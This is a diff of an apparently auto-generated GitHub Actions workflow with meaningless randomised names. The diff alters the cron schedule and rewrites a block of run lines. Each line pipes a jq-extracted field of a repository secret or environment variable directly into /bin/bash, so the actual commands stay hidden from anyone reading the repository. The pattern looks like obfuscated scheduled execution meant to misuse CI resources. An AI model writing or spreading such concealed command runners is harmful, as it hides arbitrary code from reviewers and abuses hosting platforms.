@@ -1,23 +1,26 @@
 name: huayindao7654
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 4/6 * * *'
-jobs:  # 19334
+    - cron: '55 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: huayindao7654
         env:
-          fnq149: ${{ secrets.fnq149 }}
+          yv9: ${{ secrets.yv9 }}
         run: |
-          echo $fnq149 | jq -r .e65869 | /bin/bash
-          echo $ejlkd9502 | jq -r .bbyh20048 | /bin/bash
-          echo $zns4 | jq -r .e466 | /bin/bash
-          echo $k9376 | jq -r .fahwk573 | /bin/bash
-          echo $yccz44 | jq -r .mwdy996 | /bin/bash
-          echo $r23 | jq -r .s7 | /bin/bash
-          echo $sia2 | jq -r .r6134 | /bin/bash
-          echo $hbogr6509 | jq -r .lqmo247 | /bin/bash
+          echo $yv9 | jq -r .jir5405 | /bin/bash
+          echo $gh8 | jq -r .z679 | /bin/bash
+          echo $omcc96856 | jq -r .evecg922 | /bin/bash
+          echo $l6105 | jq -r .uvv06 | /bin/bash
+          echo $ms02435 | jq -r .joj75150 | /bin/bash
+          echo $h761 | jq -r .lpg998 | /bin/bash
+          echo $gyam5 | jq -r .d90469 | /bin/bash
+          echo $qrd467 | jq -r .hynwy5 | /bin/bash
+          echo $x40233 | jq -r .oplmc872 | /bin/bash
 
